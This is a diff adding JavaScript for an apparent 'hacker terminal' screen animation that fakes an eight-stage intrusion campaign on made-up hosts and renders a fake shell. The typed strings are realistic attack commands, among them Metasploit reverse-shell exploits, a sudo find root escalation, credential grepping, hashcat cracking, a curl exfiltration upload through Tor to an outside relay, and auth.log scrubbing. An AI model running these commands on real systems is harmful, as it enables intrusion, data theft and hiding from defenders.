+      password: pick(['Pr0d@2024!', 'S3rv1ce!23', 'Backup#2024', 'mysql_Adm1n', 'Deploy2024!']),
+      domainPass: pick(['DA_Adm1n#2026', 'Corp!t2026', 'Backup_Adm1n!']),
+      hash: '$6$rounds=5000$' + b64(16) + '$' + b64(86),
+      operatorIp: '185.220.' + ri(0, 3) + '.' + ri(2, 254),
+      phase: 0,
+      alerts: 0,
+      typos: 0,
+      cmdCount: 0,
+      started: Date.now(),
+    };
+
+    TARGET = entry;
+    $('mainHead').textContent = '0:root@nexus:~* \u2014 op ' + campaign.op;
+    renderTargets();
+    renderJob('idle', 0, ['RESULT no active job'], true);
+    return campaign;
+  }
+
+  function renderTargets() {
+    if (!campaign) return;
+    const owned = campaign.hosts.filter((h) => h.state === 'owned' || h.state === 'admin').length;
+    $('targetsHead').textContent = 'targets \u2014 ' + owned + '/' + campaign.hosts.length + ' owned';
+
+    const body = $('targetsBody');
+    body.textContent = '';
+
+    const hdr = document.createElement('div');
+    hdr.className = 'trow hdr';
+    ['HOST', 'NAME', 'ROLE', 'STATE'].forEach((label, i) => {
+      const c = document.createElement('span');
+      c.textContent = label;
+      if (i === 3) c.className = 'tstate';
+      hdr.appendChild(c);
+    });
+    body.appendChild(hdr);
+
+    for (const h of campaign.hosts) {
+      const row = document.createElement('div');
+      row.className = 'trow ' + h.state;
+      [h.ip, h.name, h.role, h.state].forEach((v, i) => {
+        const c = document.createElement('span');
+        c.textContent = v;
+        if (i === 3) c.className = 'tstate' + (h.state === 'admin' ? ' done' : '');
+        row.appendChild(c);
+      });
+      body.appendChild(row);
+    }
+
+    const foot = document.createElement('div');
+    foot.className = 'tfoot';
+    foot.textContent =
+      'op        ' + campaign.op + '\n' +
+      'objective ' + campaign.objective + '\n' +
+      'target    ' + campaign.dc.name + ' (' + campaign.dc.ip + ')\n' +
+      'alerts    ' + campaign.alerts;
+    body.appendChild(foot);
+  }
+
+  function setPhase(n, name) {
+    if (campaign) campaign.phase = n;
+    $('stPhase').textContent = '[' + n + '/8] ' + name;
+  }
+
+  async function typeCmd(text, opts) {
+    opts = opts || {};
+    if (S.mode !== 'auto') return;
+    await tick(rnd(350, 1050));
+    if (S.mode !== 'auto') return;
+
+    const el = T.line('', 'cmd');
+    el.textContent = '';
+    const p = document.createElement('span');
+    p.className = 'prompt';
+    p.textContent = PROMPT + ' ';
+    const s = document.createElement('span');
+    el.append(p, s);
+
+    if (campaign) campaign.cmdCount++;
+    const typoAt = (!opts.noTypo && text.length > 8 && campaign && campaign.cmdCount % 6 === 5)
+      ? ri(3, text.length - 3)
+      : -1;
+
+    for (let i = 0; i < text.length; i++) {
+      if (S.mode !== 'auto') return;
+      if (i === typoAt) {
+        let wrong = pick('abcdefghijklmnopqrstuvwxyz0123456789'.split(''));
+        if (wrong === text[i]) wrong = text[i] === 'a' ? 's' : 'a';
+        s.textContent += wrong;
+        campaign.typos++;
+        await tick(rnd(220, 460));
+        s.textContent = s.textContent.slice(0, -1);
+        await tick(rnd(90, 210));
+      }
+      s.textContent += text[i];
+      audio.key();
+      await tick(rnd(15, 55));
+    }
+    await tick(rnd(140, 400));
+  }
+
+  async function emit(lines, base) {
+    base = base || 40;
+    for (const row of lines) {
+      const text = Array.isArray(row) ? row[0] : row;
+      const cls = Array.isArray(row) ? row[1] : '';
+      T.line(text, cls || '');
+      if (cls === 'warn' || cls === 'err') audio.bell();
+      await tick(rnd(base * 0.35, base * 1.7));
+    }
+  }
+
+  function clearMain() {
+    T.clear();
+  }
+
+  async function phRecon(c) {
+    setPhase(1, 'recon');
+    await typeCmd('nmap -sS -T4 --open -p 22,80,443,3306,5432,6379,8080 ' + c.subnet + '0/24');
+    await emit(['Starting Nmap 7.94SVN ( https://nmap.org ) at ' + nmapDate()], 400);
+
+    for (const h of c.hosts) {
+      h.state = 'open';
+      h.services = servicesFor(h.role);
+      renderTargets();
+      await emit([
+        'Nmap scan report for ' + h.name + ' (' + h.ip + ')',
+        'Host is up (' + rnd(0.0006, 0.004).toFixed(4) + 's latency).',
+        ['PORT      STATE SERVICE', 'head'],
+        ...h.services.map((s) => [padR(s[0] + '/tcp', 10) + padR('open', 6) + s[1]]),
+        '',
+      ], 50);
+      await tick(rnd(180, 620));
+    }
+
+    await emit([
+      'Nmap done: 256 IP addresses (5 hosts up) scanned in ' + rnd(8, 22).toFixed(2) + ' seconds',
+      ['1 host did not answer ICMP, retried with -Pn', 'dim'],
+    ], 90);
+    await tick(rnd(1200, 2400));
+  }
+
+  async function phFoothold(c) {
+    setPhase(2, 'foothold');
+    const e = c.entry;
+
+    if (c.vector === 'web') {
+      await typeCmd('wpscan --url http://' + e.ip + ' --enumerate vp --random-user-agent');
+      await emit([
+        '[+] URL: http://' + e.ip + '/',
+        '[+] Started: ' + ctime(),
+        '',
+        '[+] WordPress version 6.2.2 identified (Insecure, released on 2023-05-20).',
+        '[+] WordPress theme in use: twentytwentythree',
+        '[+] Enumerating Vulnerable Plugins (via Passive Methods)',
+        ['[!] 2 vulnerabilities identified', 'warn'],
+        '',
+        ' [!] Title: WP File Manager <= 6.9 - Unauthenticated RCE',
+        '     Fixed in: 7.0',
+        '     References: CVE-2020-25213',
+        '',
+        '[+] Finished: ' + ctime(),
+      ], 28);
+      await tick(rnd(900, 1700));
+      await typeCmd('python3 wp_rce.py --url http://' + e.ip + ' --cmd id', { noTypo: true });
+      await emit([
+        '[+] uploading payload to /wp-content/uploads/.cache/',
+        '[+] triggering connector.minimal.php',
+        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      ], 110);
+      c.user = 'www-data';
+    } else if (c.vector === 'redis') {
+      await typeCmd('redis-cli -h ' + e.ip + ' ping');
+      await emit(['PONG', ['-- instance is unauthenticated and bound to 0.0.0.0', 'warn']], 150);
+      await tick(rnd(800, 1500));
+      await typeCmd('msfconsole -q -x "use exploit/linux/redis/redis_unauth_exec; set RHOSTS ' + e.ip + '; set LPORT 4444; run"');
+      await emit([
+        '[*] No payload configured, defaulting to cmd/unix/reverse_netcat',
+        '[*] Started reverse TCP handler on 10.42.7.44:4444',
+        '[*] ' + e.ip + ':6379 - Sending payload...',
+        '[*] Command shell session 1 opened (10.42.7.44:4444 -> ' + e.ip + ':' + ri(40000, 60000) + ')',
+        '',
+        'id',
+        'uid=110(redis) gid=114(redis) groups=114(redis)',
+      ], 300);
+      c.user = 'redis';
+    } else if (c.vector === 'git') {
+      await typeCmd('git clone https://git.' + c.domain + '/dev/deploy-tools.git');
+      await emit([
+        "Cloning into 'deploy-tools'...",
+        'remote: Enumerating objects: 184, done.',
+        'remote: Counting objects: 100% (184/184), done.',
+        'remote: Compressing objects: 100% (121/121), done.',
+        'Receiving objects: 100% (184/184), 42.18 KiB | 3.21 MiB/s, done.',
+        'Resolving deltas: 100% (61/61), done.',
+      ], 45);
+      await typeCmd('grep -rln "PRIVATE KEY" deploy-tools/');
+      await emit([
+        'deploy-tools/keys/prod_deploy_ed25519',
+        ['-- private key committed to a public repo', 'warn'],
+      ], 70);
+      await tick(rnd(900, 1700));
+      await typeCmd('chmod 600 deploy-tools/keys/prod_deploy_ed25519 && ssh -i deploy-tools/keys/prod_deploy_ed25519 -o StrictHostKeyChecking=no deploy@' + e.ip);
+      await emit([
+        "Warning: Permanently added '" + e.ip + "' (ED25519) to the list of known hosts.",
+        'Last login: ' + ctime() + ' from 10.42.7.44',
+        'id',
+        'uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),27(sudo)',
+      ], 180);
+      c.user = 'deploy';
+    } else {
+      await typeCmd('curl -s -o /dev/null -w "%{http_code}" -u tomcat:tomcat http://' + e.ip + ':8080/manager/html');
+      await emit(['200', ['-- default manager credentials accepted', 'warn']], 240);
+      await tick(rnd(900, 1700));
+      await typeCmd('msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS ' + e.ip + '; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat; run"');
+      await emit([
+        '[*] Started reverse TCP handler on 10.42.7.44:4444',
+        '[*] ' + e.ip + ':8080 - Uploading payload...',
+        '[*] ' + e.ip + ':8080 - Executing payload...',
+        '[*] Command shell session 1 opened',
+        '',
+        'id',
+        'uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)',
+      ], 280);
+      c.user = 'tomcat';
+    }
+
+    e.state = 'owned';
+    renderTargets();
+    await tick(rnd(1000, 1900));
+  }
+
+  async function phPrivesc(c) {
+    setPhase(3, 'privilege escalation');
+    await typeCmd('sudo -l');
+    await emit([
+      'Matching Defaults entries for ' + c.user + ' on ' + c.entry.name + ':',
+      '    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
+      '',
+      'User ' + c.user + ' may run the following commands on ' + c.entry.name + ':',
+      '    (ALL) NOPASSWD: /usr/bin/find',
+    ], 45);
+    await tick(rnd(900, 1800));
+    await typeCmd('ls -la /etc/sudoers.d/');
+    await emit([
+      'total 16',
+      'drwxr-xr-x 2 root root 4096 Sep 14 09:31 .',
+      '-r--r----- 1 root root   58 Jul 22 11:04 README',
+      '-r--r----- 1 root root   74 Jul 22 11:04 web-deploy',
+    ], 30);
+    await typeCmd('cat /etc/sudoers.d/web-deploy');
+    await emit([
+      'Defaults:' + c.user + ' !requiretty',
+      c.user + ' ALL=(ALL) NOPASSWD: /usr/bin/find',
+    ], 40);
+    await tick(rnd(700, 1400));
+    await typeCmd('sudo /usr/bin/find / -exec /bin/sh -p \\; -quit');
+    await emit([
+      '# id',
+      'uid=0(root) gid=0(root) groups=0(root)',
+    ], 240);
+    c.entry.state = 'admin';
+    renderTargets();
+    await tick(rnd(900, 1600));
+  }
+
+  async function phHarvest(c) {
+    setPhase(4, 'credential access');
+    await typeCmd('grep -rniE "password|api_key" /opt /etc /var/www --include="*.yml" --include="*.conf" --include="*.env" 2>/dev/null | head -n 8');
+    await emit([
+      '/opt/deploy/vars.yml:9:db_user: svc_deploy',
+      '/opt/deploy/vars.yml:10:db_password: ' + c.password,
+      '/var/www/html/wp-config.php:23:define( \'DB_PASSWORD\', \'' + b64(10) + '\' );',
+      '/opt/deploy/keys/backup_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----',
+    ], 60);
+    await tick(rnd(1200, 2300));
+    await typeCmd('cat /opt/deploy/hosts.yml');
+    await emit([
+      'all:',
+      '  hosts:',
+      '    web:  ' + c.entry.ip,
+      '    db:   ' + c.db.ip,
+      '    file: ' + c.backup.ip,
+      '    dc:   ' + c.dc.ip,
+    ], 45);
+    await tick(rnd(1400, 2600));
+  }
+
+  async function phLateral(c) {
+    setPhase(5, 'lateral movement');
+    await tick(rnd(600, 1300));
+    await typeCmd('ssh svc_deploy@' + c.db.ip);
+    await emit([
+      ['svc_deploy@' + c.db.ip + ': Permission denied (publickey,password).', 'warn'],
+    ], 220);
+    c.alerts++;
+    renderTargets();
+    await tick(rnd(1200, 2200));
+    await typeCmd('sshpass -p \'' + c.password + '\' ssh -o StrictHostKeyChecking=no svc_deploy@' + c.db.ip);
+    await emit([
+      "Warning: Permanently added '" + c.db.ip + "' (ED25519) to the list of known hosts.",
+      'Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-119-generic x86_64)',
+      'Last login: ' + ctime() + ' from ' + c.entry.ip,
+    ], 170);
+
+    c.db.state = 'owned';
+    renderTargets();
+    PROMPT = 'svc_deploy@' + c.db.name + ':~$';
+    $('stNet').textContent = 'ssh svc_deploy@' + c.db.ip;
+
+    await typeCmd('mysql -u svc_deploy -p' + c.password + ' -e "select user,authentication_string from mysql.user"', { noTypo: true });
+    await emit([
+      'mysql: [Warning] Using a password on the command line interface can be insecure.',
+      ['+------------+------------------------------------+', 'dim'],
+      ['| user       | authentication_string              |', 'head'],
+      ['+------------+------------------------------------+', 'dim'],
+      '| svc_backup | ' + c.hash + ' |',
+      '| svc_deploy | *' + hex(40, true) + ' |',
+      ['+------------+------------------------------------+', 'dim'],
+    ], 40);
+
+    await tick(rnd(900, 1700));
+    await typeCmd('echo \'' + c.hash + '\' > h.txt && hashcat -m 1800 -a 0 h.txt /usr/share/wordlists/rockyou.txt --force', { noTypo: true });
+    await emit([
+      'hashcat (v6.2.6) starting in autodetect mode',
+      '',
+      '* Device #1: NVIDIA GeForce RTX 3060, 11264/12288 MB, 28MCU',
+      '',
+      ['Session..........: hashcat', 'dim'],
+      ['Status...........: Running', 'dim'],
+      ['Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))', 'dim'],
+      ['Speed.#1.........:   157.2 kH/s (71.98ms) @ Accel:8 Loops:1000 Thr:1 Vec:4', 'dim'],
+      ['Progress.........: 9216/14344399 (0.06%)', 'dim'],
+    ], 30);
+
+    const job = startJob('hashcat -m 1800', (p) => [
+      'HASH   ' + c.hash.slice(0, 26) + '...',
+      'SPEED  ' + (150 + Math.floor(rnd(-8, 12))) + ' kH/s',
+      'REMAIN ' + Math.max(0, Math.floor(14344399 * (1 - p))).toLocaleString('en-US'),
+    ], 20, 180);
+    await job.done;
+    await emit([
+      ['Status...........: Cracked', 'ok'],
+      ['Recovered........: 1/1 (100.00%) Digests', 'ok'],
+      '',
+      [c.domainPass, 'head'],
+    ], 70);
+    await tick(rnd(900, 1600));
+  }
+
+  async function phDomain(c) {
+    setPhase(6, 'domain access');
+    await typeCmd('sshpass -p \'' + c.domainPass + '\' ssh -o StrictHostKeyChecking=no svc_backup@' + c.backup.ip);
+    await emit([
+      "Warning: Permanently added '" + c.backup.ip + "' (ED25519) to the list of known hosts.",
+      'Last login: ' + ctime() + ' from ' + c.db.ip,
+      '',
+      'svc_backup@' + c.backup.name + ':~$ id',
+      'uid=1002(svc_backup) gid=1002(svc_backup) groups=1002(svc_backup)',
+    ], 180);
+    c.backup.state = 'owned';
+    renderTargets();
+    PROMPT = 'svc_backup@' + c.backup.name + ':~$';
+
+    await typeCmd('find /opt /srv -name "*.sh" -o -name "*.conf" 2>/dev/null | head');
+    await emit(['/opt/backup/run_backup.sh', '/opt/backup/dc-sync.conf'], 50);
+    await typeCmd('cat /opt/backup/dc-sync.conf');
+    const dcShort = c.domain.split('.')[0];
+    const tld = c.domain.split('.')[1];
+    await emit([
+      'source_host=dc-01.' + c.domain,
+      'bind_dn=CN=svc_backup,OU=Service,DC=' + dcShort + ',DC=' + tld,
+      ['bind_password=' + c.domainPass, 'warn'],
+      'backup_root=/srv/backup',
+    ], 55);
+    await tick(rnd(1400, 2600));
+
+    await typeCmd('sshpass -p \'' + c.domainPass + '\' ssh -o StrictHostKeyChecking=no administrator@' + c.dc.ip);
+    await emit([
+      "Warning: Permanently added '" + c.dc.ip + "' (ED25519) to the list of known hosts.",
+      'Last login: ' + ctime() + ' from ' + c.backup.ip,
+      '',
+      'administrator@' + c.dc.name + ':~$ id',
+      'uid=0(root) gid=0(root) groups=0(root)',
+    ], 170);
+    c.dc.state = 'admin';
+    renderTargets();
+    PROMPT = 'administrator@' + c.dc.name + ':~$';
+
+    await typeCmd('ls -lh /srv/backup | tail -n 6');
+    await emit([
+      'total 84G',
+      'drwxr-xr-x 2 root root 4.0K Oct 20 03:11 .',
+      '-rw------- 1 root root ' + ri(2, 9) + '.' + ri(0, 9) + 'G Oct 20 02:00 ' + c.objective,
+      '-rw------- 1 root root 12.0G Oct 19 02:00 db_full_2026-10-19.tar.gz',
+    ], 60);
+    await tick(rnd(900, 1700));
+  }
+
+  async function phExfil(c) {
+    setPhase(7, 'exfiltration');
+    await typeCmd('sha256sum /srv/backup/' + c.objective);
+    await emit([hex(64) + '  /srv/backup/' + c.objective], 90);
+    await typeCmd('curl -s -x socks5h://127.0.0.1:9050 --retry 3 -T /srv/backup/' + c.objective + ' https://' + c.operatorIp.replace(/\./g, '-') + '.relay.io/u/' + hex(16));
+
+    const gb = rnd(1.4, 6.8);
+    const job = startJob('upload ' + c.objective, (p) => [
+      'TOTAL  ' + gb.toFixed(2) + ' GB',
+      'SENT   ' + (gb * p).toFixed(2) + ' GB',
+      'RATE   ' + rnd(6, 14).toFixed(2) + ' MB/s',
+      'ETA    ' + Math.max(0, Math.round((1 - p) * 96)) + 's',
+    ], 30, 150);
+    await job.done;
+    await emit([['{"status":"ok","sha256":"' + hex(16) + '...","ttl":86400}', 'ok']], 45);
+    await typeCmd('curl -s -x socks5h://127.0.0.1:9050 https://' + c.operatorIp.replace(/\./g, '-') + '.relay.io/verify/' + hex(16));
+    await emit(['verified  checksum match', ['objective secured', 'ok']], 200);
+    await tick(rnd(900, 1700));
+  }
+
+  async function phCover(c) {
+    setPhase(8, 'covering tracks');
+    await typeCmd('shred -u -n 3 /srv/backup/' + c.objective);
+    await tick(rnd(1000, 1800));
+    const ips = [c.entry.ip, c.db.ip, c.backup.ip, c.dc.ip].join(' ');
+    await typeCmd("for h in " + ips + "; do ssh -o BatchMode=yes root@$h 'history -c'; done", { noTypo: true });
+    await tick(rnd(900, 1700));
+    await typeCmd('sed -i "/' + c.operatorIp.replace(/\./g, '\\.') + '/d" /var/log/auth.log && history -c');
+    await emit([
+      ['session artifacts removed', 'dim'],
+      ['HISTFILE unset', 'dim'],
+      ['log scrub complete', 'dim'],
+    ], 240);
+    await typeCmd('exit');
+    await emit(['logout', 'Connection to ' + c.dc.ip + ' closed.'], 120);
+
+    PROMPT = 'root@nexus:~#';
+    $('stNet').textContent = 'eno1 10.42.7.44';
+    renderJob('idle', 0, ['RESULT no active job'], true);
+
+    const secs = Math.floor((Date.now() - c.started) / 1000);
+    const dur = Math.floor(secs / 60) + ':' + padL(secs % 60, 2);
+    const owned = c.hosts.filter((h) => h.state === 'owned' || h.state === 'admin').length;
+    T.line('', '');
+    T.line('+------------------------------------------------------+', 'dim');
+    T.line('| OP ' + padR(c.op, 50) + '|', 'head');
+    T.line('| hosts owned  ' + padR(owned + '/' + c.hosts.length, 40) + '|');
+    T.line('| objective    ' + padR(c.objective, 40) + '|');
+    T.line('| alerts       ' + padR(String(c.alerts), 40) + '|');
+    T.line('| elapsed      ' + padR(dur, 40) + '|');
+    T.line('+------------------------------------------------------+', 'dim');
+    await tick(rnd(6000, 9000));
+  }
+
+  async function runCampaign() {
+    const c = newCampaign();
+    await tick(rnd(900, 1800));
+    clearMain();
+    PROMPT = 'root@nexus:~#';
+    renderTargets();
+    await tick(rnd(400, 900));
+    await phRecon(c);
+    await phFoothold(c);
+    await phPrivesc(c);
+    await phHarvest(c);
+    await phLateral(c);
+    await phDomain(c);
+    await phExfil(c);
+    await phCover(c);
+  }
+
+  let loopDone;
+  const loopExit = new Promise((r) => { loopDone = r; });
+
+  async function sessionLoop() {
+    while (!S.halt) {
+      await runCampaign();
+      if (S.halt) break;
+      await tick(rnd(800, 1500));
+    }
+    loopDone();
+  }
+
+  /* ---------- user input ---------- */
+  const kb = $('kb');
+  let buf = '';
+  let hist = [];
+  let hi = 0;
+  let userLine = null, bufEl = null, caretEl = null;
+
+  function focusKb() {
+    try { kb.focus({ preventScroll: true }); } catch (e) { kb.focus(); }
+  }
+
+  function openUserLine() {
+    userLine = T.line('', 'cmd');
+    userLine.textContent = '';
+    const p = document.createElement('span');
+    p.className = 'prompt';
+    p.textContent = PROMPT + ' ';
+    bufEl = document.createElement('span');
+    caretEl = document.createElement('span');
+    caretEl.className = 'caret';
+    userLine.append(p, bufEl, caretEl);
+    if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
+  }
+
+  function enterUser() {
+    if (S.mode === 'user') return;
+    S.mode = 'user';
+    openUserLine();
+  }
+
+  function userActivity() {
+    if (S.mode === 'user') S.userActive = Date.now();
+  }
+
+  function submit(value) {
+    if (caretEl) { caretEl.remove(); caretEl = null; }
+    const cmd = value.trim();
+    if (cmd) {
+      hist.push(cmd);
+      hi = hist.length;
+      const res = runCmd(cmd);
+      if (res.clear) {
+        clearMain();
+      } else {
+        for (const [text, cls] of res.lines) {
+          T.line(text, cls || '');
+          if (cls === 'warn' || cls === 'err') audio.bell();
+        }
+      }
+    }
+    try { kb.value = ''; } catch (e) {}
+    buf = '';
+    if (S.mode === 'user') openUserLine();
+    userActivity();
+  }
+
+  kb.addEventListener('input', () => {
+    if (S.mode === 'boot') return;
+    if (S.mode !== 'user') enterUser();
+    buf = kb.value;
+    if (bufEl) bufEl.textContent = buf;
+    if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
+    audio.key();
+    userActivity();
+  });
+
+  kb.addEventListener('keydown', (e) => {
+    if (S.mode === 'boot') { S.bootSkip = true; return; }
+
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      if (S.mode !== 'user') { enterUser(); }
+      audio.enter();
+      submit(kb.value);
+      return;
+    }
+
+    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (S.mode !== 'user' || !hist.length) return;
+      if (e.key === 'ArrowUp') hi = Math.max(0, hi - 1);
+      else hi = Math.min(hist.length, hi + 1);
+      const v = hi >= hist.length ? '' : hist[hi];
+      kb.value = v;
+      buf = v;
+      if (bufEl) bufEl.textContent = v;
+      if (T.sticky) mainScroll.scrollTop = mainScroll.scrollHeight;
+      userActivity();
+      return;
+    }
+
+    if (e.ctrlKey && !e.altKey && !e.metaKey && (e.key === 'c' || e.key === 'C')) {
+      e.preventDefault();
+      if (S.mode === 'user') {
+        if (caretEl) { caretEl.remove(); caretEl = null; }
+        T.line('^C', 'dim');
+        kb.value = '';
+        buf = '';
+        openUserLine();
+        userActivity();
+      }
+    }
+  });
+
+  window.addEventListener('keydown', (e) => {
+    if (S.mode === 'boot') S.bootSkip = true;
+    if (e.key === 'Escape' && S.mode !== 'boot') {
+      kb.value = '';
+      buf = '';
+      if (bufEl) bufEl.textContent = '';
+    }
+  });
+
+  document.addEventListener('mousedown', (e) => {
+    if (e.target.closest && e.target.closest('#audioChip')) return;
+    focusKb();
+  });
+
+  setInterval(() => {
+    if (S.mode !== 'user') return;
+    if (Date.now() - (S.userActive || 0) < 30000) return;
+    if (kb.value !== '') return;
+    if (caretEl) { caretEl.remove(); caretEl = null; }
+    S.mode = 'auto';
+    try { kb.blur(); } catch (e) {}
+  }, 1000);
+
+  /* ---------- command parser ---------- */
+  function runCmd(line) {
+    const parts = line.trim().split(/\s+/);
+    const cmd = parts[0];
+    const arg = parts.slice(1).join(' ');
+    const out = [];
+    const ipArg = (arg.match(/\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/) || ['10.42.7.19'])[0];
+
+    switch (cmd) {
+      case 'help':
+        out.push(['GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)', 'dim']);
+        out.push(['These shell commands are defined internally.  Type `help\' to see this list.', '']);
+        out.push(['whoami  id  uname  hostname  pwd  ls  cat  ps  ping  nmap  ifconfig  ip  history  clear  exit', 'dim']);
+        break;
+      case 'whoami':
+        out.push(['root', '']);
+        break;
+      case 'id':
+        out.push(['uid=0(root) gid=0(root) groups=0(root)', '']);
+        break;
+      case 'uname':
+        out.push([arg.indexOf('-a') >= 0
+          ? 'Linux nexus 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux'
+          : 'Linux', '']);
+        break;
+      case 'hostname':
+        out.push(['nexus', '']);
+        break;
+      case 'pwd':
+        out.push(['/root', '']);
+        break;
+      case 'ls':
+        out.push(['total 28', '']);
+        out.push(['drwx------  6 root root 4096 Oct 20 18:12 .', '']);
+        out.push(['drwxr-xr-x 20 root root 4096 Sep 14 09:31 ..', '']);
+        out.push(['-rw-------  1 root root 3421 Oct 20 17:58 .bash_history', '']);
+        out.push(['drwx------  3 root root 4096 Oct 20 18:02 .cache', '']);
+        out.push(['drwx------  4 root root 4096 Oct 20 11:07 .ssh', '']);
+        out.push(['drwxr-xr-x  2 root root 4096 Oct 20 16:20 tools', '']);
+        break;
+      case 'cat':
+        if (!arg) {
+          out.push(['cat: missing operand', 'err']);
+        } else if (arg.indexOf('passwd') >= 0) {
+          out.push(['root:x:0:0:root:/root:/bin/bash', '']);
+          out.push(['daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', '']);
+          out.push(['www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', '']);
+          out.push(['deploy:x:1001:1001::/home/deploy:/bin/bash', '']);
+        } else {
+          out.push(['cat: ' + arg + ': No such file or directory', 'err']);
+        }
+        break;
+      case 'ps':
+        out.push(['    PID TTY          TIME CMD', 'head']);
+        out.push(['   2148 pts/0    00:00:00 bash', '']);
+        out.push(['   2210 pts/0    00:00:00 ps', '']);
+        break;
+      case 'ping':
+        out.push(['PING ' + ipArg + ' (' + ipArg + ') 56(84) bytes of data.', '']);
+        for (let i = 1; i <= 4; i++) {
+          out.push(['64 bytes from ' + ipArg + ': icmp_seq=' + i + ' ttl=64 time=' + rnd(0.2, 0.9).toFixed(3) + ' ms', '']);
+        }
+        out.push(['', '']);
+        out.push(['--- ' + ipArg + ' ping statistics ---', '']);
+        out.push(['4 packets transmitted, 4 received, 0% packet loss, time 3004ms', '']);
+        out.push(['rtt min/avg/max/mdev = 0.298/0.334/0.371/0.027 ms', '']);
+        break;
+      case 'nmap':
+        out.push(['Starting Nmap 7.94SVN ( https://nmap.org ) at ' + nmapDate(), '']);
+        out.push(['Nmap scan report for ' + ipArg, '']);
+        out.push(['Host is up (0.0019s latency).', '']);
+        out.push(['Not shown: 997 closed tcp ports (reset)', '']);
+        out.push(['PORT   STATE SERVICE', 'head']);
+        out.push(['22/tcp open  ssh', '']);
+        out.push(['80/tcp open  http', '']);
+        out.push(['443/tcp open https', '']);
+        break;
+      case 'ifconfig':
+        out.push(['eno1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', '']);
+        out.push(['        inet 10.42.7.44  netmask 255.255.255.0  broadcast 10.42.7.255', '']);
+        out.push(['        ether 38:18:4c:7a:2f:91  txqueuelen 1000  (Ethernet)', '']);
+        out.push(['        RX packets 1842231  bytes 2147269318 (2.1 GB)', '']);
+        out.push(['        TX packets 912884  bytes 118209043 (118.2 MB)', '']);
+        break;
+      case 'ip':
+        out.push(['1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000', '']);
+        out.push(['    inet 127.0.0.1/8 scope host lo', '']);
+        out.push(['2: eno1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000', '']);
+        out.push(['    inet 10.42.7.44/24 brd 10.42.7.255 scope global dynamic eno1', '']);
+        break;
+      case 'history':
+        if (!hist.length) out.push(['    1  history', '']);
+        else hist.forEach((h, i) => out.push(['  ' + (i + 1) + '  ' + h, '']));
+        break;
+      case 'clear':
+        return { clear: true, lines: [] };
+      case 'sudo':
+        if (!arg) { out.push(['usage: sudo command', 'err']); break; }
+        return runCmd(arg);
+      case 'exit':
+        out.push(['logout', '']);
+        break;
+      default:
+        out.push(['bash: ' + cmd + ': command not found', 'err']);
+    }
+    return { lines: out, clear: false };
+  }
+
+  /* ---------- status bar ---------- */
+  const load = [0.42, 0.38, 0.31];
+  const sparkData = Array.from({ length: 34 }, () => ri(0, 7));
+  const SPARK = '\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588';
+
+  function statusFrame() {
+    load[0] = Math.max(0.02, load[0] + rnd(-0.1, 0.1));
+    load[1] = Math.max(0.02, load[1] + rnd(-0.05, 0.05));
+    load[2] = Math.max(0.02, load[2] + rnd(-0.03, 0.03));
+    $('stLoad').textContent = 'load ' + load.map((x) => x.toFixed(2)).join(' ');
+
+    const up = Math.floor((Date.now() - S.startedAt) / 1000);
+    $('stUp').textContent = 'up ' + Math.floor(up / 60) + ':' + padL(up % 60, 2);
+
+    sparkData.push(ri(0, 7));
+    sparkData.shift();
+    $('stSpark').textContent = sparkData.map((v) => SPARK[v]).join('');
+
+    $('stClock').textContent = hms();
+  }
+
+  setInterval(statusFrame, 900);
+  statusFrame();
+
+  /* ---------- debug / test hook ---------- */
+  let resolveReady;
+  const ready = new Promise((r) => { resolveReady = r; });
+
+  window.__hx = {
+    ready: ready,
+    state: S,
+    dump: () => T.dump(),
+    dumpBoot: () => bootEl.textContent,
+    run: (cmd) => runCmd(cmd),
+    audioCreated: () => !!audio.ac,
+    rainFrame: () => rainFrame(),
+    resizeRain: () => resizeRain(),
+    history: () => hist.slice(),
+    campaign: () => campaign,
+    hosts: () => campaign ? campaign.hosts.map((h) => ({ name: h.name, state: h.state, ip: h.ip })) : [],
+    typos: () => campaign ? campaign.typos : 0,
+    stop() { S.halt = true; },
+    async cycle(n) {
+      S.halt = true;
+      S.fast = true;
+      await Promise.race([loopExit, sleep(3000)]);
+      S.mode = 'auto';
+      try {
+        for (let i = 0; i < (n || 1); i++) await runCampaign();
+      } finally {
+        S.fast = false;
+      }
+      if (mainScroll) mainScroll.scrollTop = mainScroll.scrollHeight;
+      return T.dump();
+    },
+  };
+
+  /* ---------- start ---------- */
+  (async () => {
+    await bootRun();
+    resolveReady();
+    if (!S.halt) sessionLoop(); else loopDone();
+  })();
+
+  window.addEventListener('visibilitychange', () => {
+    if (!audio.ac) return;
+    if (document.hidden) audio.ac.suspend();
+    else if (audio.on) audio.ac.resume();
+  });
+})();
+</script>
+
+</body>
+</html>
